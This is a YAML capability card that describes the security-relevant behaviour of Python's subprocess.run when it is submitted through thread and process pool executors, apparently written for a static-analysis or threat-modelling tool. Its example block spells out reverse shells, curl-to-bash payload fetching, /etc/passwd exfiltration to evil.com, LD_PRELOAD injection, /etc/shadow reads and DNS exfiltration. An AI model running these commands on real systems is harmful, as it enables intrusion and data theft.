# subprocess.run (via concurrent.futures.Executor.submit)

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-4ac31e448a356eb4
api: subprocess.run (via concurrent.futures.Executor.submit)
api_family: subprocess.run.via-executor-submit
runtime:
  language: python
  ecosystem: python-runtime
  package: subprocess
  version: legacy-source-bound
capability_class: process-spawn
normative_authority: capability-facts-only
bound_sinks:
- Executor.submit(subprocess.run, ...)
- ThreadPoolExecutor.submit(subprocess.run, ...)
- ProcessPoolExecutor.submit(subprocess.run, ...)
roles:
- role_id: command
  description: Legacy controlled role command.
  bindings:
  - expression: args
    caller_bindable: true
  - expression: command
    caller_bindable: true
- role_id: shell-mode
  description: Legacy controlled role shell-mode.
  bindings:
  - expression: shell
    caller_bindable: true
facets:
- facet_id: legacy-facet-db7589fb
  capability: 'Spawn an arbitrary child process from a list of arguments (safe form: subprocess.run(["cmd", "arg1", "arg2"])).'
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-09f8e12a
  capability: 'Spawn an arbitrary child process from a single string when shell=True, with the full shell grammar available: command chaining (&&, ||, ;, |), command substitution ($(...), backticks), shell redirects (>, >>, <, 2>, &>), here-docs (<<), backgrounding (&), glob expansion (*, ?, [...]), variable expansion ($VAR, ${VAR}).'
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-36a3a4ec
  capability: Pass arbitrary stdin data to the child via the input= parameter (bytes or string), up to available memory.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-942b4f14
  capability: Capture stdout and stderr of the child via capture_output=True or stdout=PIPE / stderr=PIPE, retrieving the full output as bytes or text.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-c81ab42e
  capability: Merge stderr into stdout via stdout=PIPE, stderr=STDOUT.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-fd9d2048
  capability: Set the child's working directory to any path via cwd=, enabling path-relative exploits.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-7bad696a
  capability: Override the child's entire environment via env=, injecting or stripping environment variables (e.g., PATH, LD_PRELOAD, LD_LIBRARY_PATH on Linux; DYLD_INSERT_LIBRARIES on macOS).
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-615ace4d
  capability: Run in text mode (text=True, encoding=, errors=) so input/output are strings decoded per a chosen codec, or in binary mode (default) for raw bytes.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-588ad6ff
  capability: Set a timeout (seconds) after which the child is killed and TimeoutExpired is raised.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-0a9ab471
  capability: Check the exit code via check=True, raising CalledProcessError on non-zero exit.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-f041e277
  capability: Inherit the parent process's full environment (os.environ) by default, including all secrets, tokens, and PATH entries visible to the parent.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-ae4237a0
  capability: Inherit the parent process's current working directory (os.getcwd()) by default.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-52840b78
  capability: Inherit the parent process's open file descriptors by default (unless close_fds=True, which is NOT the default on Windows; on POSIX close_fds=True is the default since 3.2 but can be overridden).
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-1a082a93
  capability: Inherit the parent process's user/group identity (uid/gid), running the child with identical OS-level privileges.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-54e2c5be
  capability: Inherit the parent process's umask, signal mask, and resource limits.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-142c4e10
  capability: Execute ANY binary on the system reachable via PATH or absolute path, including interpreters (python, node, perl, ruby, php, bash, sh, zsh, powershell, cmd.exe).
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-8eea3839
  capability: 'Execute GTFOBins-style dual-use binaries to achieve code execution, file read, file write, or privilege escalation: find -exec, tar --checkpoint-action=exec, git -c core.gitProxy, awk system(), xargs sh -c, vi :!shell, less !command, etc.'
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-89899432
  capability: Establish a reverse shell by spawning bash -c, nc -e, python -c socket, or equivalent one-liners.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-44d0dd4a
  capability: Establish a bind shell by spawning nc -l -p PORT -e /bin/sh or equivalent.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-4751b40e
  capability: 'Download and execute remote payloads in a single pipeline: curl URL | bash, wget -O - URL | sh, python -c "exec(urllib.request.urlopen(''URL'').read())".'
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-60c3e09a
  capability: Exfiltrate data over DNS, HTTP, HTTPS, or raw TCP by spawning curl, wget, nc, dig, nslookup, or custom scripts with the data embedded in the request.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-bf6849a5
  capability: Write arbitrary files via shell redirect (echo data > /path) or commands (tee, dd, cp).
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-0aef7fcf
  capability: Read arbitrary files via cat, head, tail, or shell redirects, capturing output through PIPE.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-5d720b69
  capability: Delete / move / chmod arbitrary files via rm, mv, chmod, chown.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-64910c7d
  capability: Execute commands asynchronously and in parallel via ThreadPoolExecutor or ProcessPoolExecutor, enabling concurrent multi-stage attacks without blocking the caller.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-3887a572
  capability: 'Fire-and-forget execution: the caller need not await the Future; the process runs to completion independently in a worker thread/process.'
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-dc978802
  capability: Hide execution in a thread pool (ThreadPoolExecutor), where the child process appears as a thread of the parent, making process-tree inspection less obvious than fork+exec.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-045fb7e6
  capability: Saturate CPU or memory by spawning many concurrent processes, achieving local DoS.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
- facet_id: legacy-facet-3871e85f
  capability: Persist by writing cron jobs, systemd units, launchd plists, or startup scripts via the spawned process.
  role_ids:
  - command
  - shell-mode
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: shell-mode
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-2a99fd23
  role_id: null
  value: 'shell=False by default: the command is executed directly without shell interpretation; but this only prevents shell grammar, not execution of arbitrary binaries.'
  security_effect: 'shell=False by default: the command is executed directly without shell interpretation; but this only prevents shell grammar, not execution of arbitrary binaries.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-5012745b
  role_id: null
  value: env inherits os.environ in full, exposing all parent-process secrets, API keys, tokens, and PATH entries to the child.
  security_effect: env inherits os.environ in full, exposing all parent-process secrets, API keys, tokens, and PATH entries to the child.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-92e7040e
  role_id: null
  value: cwd inherits os.getcwd(), so relative paths in the command resolve relative to the attacker-known (or attacker-settable) working directory.
  security_effect: cwd inherits os.getcwd(), so relative paths in the command resolve relative to the attacker-known (or attacker-settable) working directory.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-97ed2903
  role_id: null
  value: 'capture_output defaults to False: stdout and stderr are NOT captured and flow to the parent''s terminal/file descriptors — the caller may not see the output, but the output still reaches whatever fd the parent inherited.'
  security_effect: 'capture_output defaults to False: stdout and stderr are NOT captured and flow to the parent''s terminal/file descriptors — the caller may not see the output, but the output still reaches whatever fd the parent inherited.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-95b81cf5
  role_id: null
  value: 'check defaults to False: non-zero exit codes do not raise; the caller may not notice failures.'
  security_effect: 'check defaults to False: non-zero exit codes do not raise; the caller may not notice failures.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2776e1b1
  role_id: null
  value: 'text/universal_newlines default to False: communication is in bytes (no automatic decoding), but this does not limit what the child can do.'
  security_effect: 'text/universal_newlines default to False: communication is in bytes (no automatic decoding), but this does not limit what the child can do.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-094d03c3
  role_id: null
  value: close_fds defaults to True on POSIX (since Python 3.2), but defaults to False on Windows — on Windows the child inherits all inheritable handles from the parent.
  security_effect: close_fds defaults to True on POSIX (since Python 3.2), but defaults to False on Windows — on Windows the child inherits all inheritable handles from the parent.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-be0af4e2
  role_id: null
  value: input= automatically sets stdin=PIPE internally, consuming whatever bytes/string the attacker supplies.
  security_effect: input= automatically sets stdin=PIPE internally, consuming whatever bytes/string the attacker supplies.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a371cfd3
  role_id: null
  value: timeout only kills the child after the timeout expires; process creation itself is not interruptible on many platforms.
  security_effect: timeout only kills the child after the timeout expires; process creation itself is not interruptible on many platforms.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c9f5e147
  role_id: null
  value: The process runs with the SAME effective uid/gid as the parent — no privilege drop occurs.
  security_effect: The process runs with the SAME effective uid/gid as the parent — no privilege drop occurs.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-e097e0cd
  role_id: null
  value: 'ThreadPoolExecutor.submit() runs subprocess.run in a daemon thread: if the main thread exits, the daemon thread and any still-running child may be terminated abruptly.'
  security_effect: 'ThreadPoolExecutor.submit() runs subprocess.run in a daemon thread: if the main thread exits, the daemon thread and any still-running child may be terminated abruptly.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-465246cc
  role_id: null
  value: 'ProcessPoolExecutor.submit() runs subprocess.run in a forked worker: on fork, the child inherits the parent''s entire memory space, file descriptors, and locks at the moment of fork.'
  security_effect: 'ProcessPoolExecutor.submit() runs subprocess.run in a forked worker: on fork, the child inherits the parent''s entire memory space, file descriptors, and locks at the moment of fork.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: 'import subprocess

    result = subprocess.run(["ls", "-l", "/tmp"], capture_output=True, text=True)

    print(result.stdout)'
  capability_edge: "import subprocess\nfrom concurrent.futures import ThreadPoolExecutor\n\n# Reverse shell via bash TCP redirect (Linux)\nsubprocess.run(\n    [\"bash\", \"-c\", \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"],\n    timeout=30\n)\n\n# Shell-chaining: download remote payload, write to file, execute, exfiltrate result\nsubprocess.run(\n    \"curl -s http://evil.com/payload.sh | bash && \"\n    \"curl -s http://evil.com/exfil?d=$(cat /etc/passwd | base64 -w0)\",\n    shell=True, capture_output=True, timeout=10\n)\n\n# Fire-and-forget via thread pool — caller continues immediately\nwith ThreadPoolExecutor(max_workers=4) as ex:\n    ex.submit(subprocess.run, [\"nc\", \"-e\", \"/bin/sh\", \"10.0.0.1\", \"5555\"])\n    ex.submit(subprocess.run, [\"curl\", \"-s\", \"-o\", \"/tmp/ implant\", \"http://evil.com/implant\"])\n\n# Environment injection — LD_PRELOAD a malicious shared library\nsubprocess.run(\n    [\"/usr/bin/id\"],\n    env={\"LD_PRELOAD\": \"/tmp/evil.so\", \"PATH\": \"\
    /tmp:/usr/bin\"}\n)\n\n# GTFOBins: find with -exec for code execution\nsubprocess.run([\"find\", \".\", \"-name\", \"x\", \"-exec\", \"cat\", \"/etc/shadow\", \";\"])\n\n# Data exfiltration over DNS\nsubprocess.run(\n    [\"bash\", \"-c\", \"dig $(hostname).attacker.com\"],\n    timeout=5\n)"
provenance:
- https://docs.python.org/3/library/subprocess.html#subprocess.run
- GTFOBins (find, xargs, awk, tar, git exec vectors)
- '{''CWE-78'': "Improper Neutralization of Special Elements used in an OS Command (''OS Command Injection'')"}'
- Python 3.12 subprocess source (Lib/subprocess.py)
- concurrent.futures module (ThreadPoolExecutor, ProcessPoolExecutor)
```
